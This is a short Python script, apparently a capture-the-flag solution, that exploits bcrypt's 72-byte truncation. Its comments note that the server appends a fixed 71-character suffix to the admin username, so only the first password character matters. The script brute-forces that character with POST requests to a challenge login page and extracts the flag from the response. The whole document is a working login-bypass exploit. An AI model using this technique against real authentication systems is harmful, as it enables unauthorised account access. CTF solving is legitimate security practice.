#Bcrypt check 72 char, but passwd has admin+additional-entropy-for-super-secure-passwords-you-will-never-guess=71 char
#Brute 1 char password lol

import requests
import string

url = 'https://entropyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy-2f567adc1e4d.1753ctf.com/' 

for c in string.printable:
    data = {
        'username': 'admin',
        'password': c
    }
    response = requests.post(url, data=data)
    if 'Hello, Admin' in response.text:
        print(f"Success! First character is: {c}")
        print("Flag:", response.text.split('secret message:<br />')[1].split('<br />')[0])
        break